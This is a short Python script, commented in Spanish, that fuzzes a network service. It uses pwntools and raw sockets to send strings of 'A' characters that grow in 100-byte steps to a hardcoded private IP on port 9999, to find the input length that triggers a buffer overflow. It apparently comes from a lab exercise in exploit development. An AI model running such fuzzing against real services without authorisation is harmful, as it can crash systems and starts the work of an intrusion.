#!/usr/bin/env python3 

import socket
import six
from pwn import *

#variables Globales
Target 	= '172.168.1.176'
Port	= 9999
timeout = 5
p1 = log.progress("Fuzzion Overflow")

# creando array con diferentes longitudes de sting para encontrar el numero de caracteres que ocaciona 
# el desbordamiento de memoria
buffe = []
offset = 100

p1.status("Creando Lista de Strings")
while len(buffe) < 30:
	buffe.append("A" * offset)
	offset += 100

p1.status("Iniciando Fuzzing")
for string in buffe:
	try: 
		# creando socket para conexion IPV4 usando TCP
		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

		# tiempo de espera para recibir una respuesta del servidor
		sock.settimeout(timeout)

		# conectando con el servidor remoto
		connect = sock.connect((Target,Port))

		# Recibiendo mensaje del servidor remoto
		sock.recv(1024)

		# Imprimiendo bytes enviados
		log.info("Enviando %s bytes" % len(string))

		# Enviando String, la funcion Six enviara la informacion en bytes
		sock.send(six.b(string))

		# terminando conexion con el servidor remoto
		sock.close()

		# esperando 1 segundo entre las conexiones
		time.sleep(1)

	except Exception as error: 
		p1.status("Proceso detenido")
		log.failure(str(error))  # mostrando error que se ha generado en el programa
		sys.exit(0)

	except KeyboardInterrupt:
		log.failure("[*] Salida Forzada [*]") # mensaje a mostrar encaso de usar Crtl + C
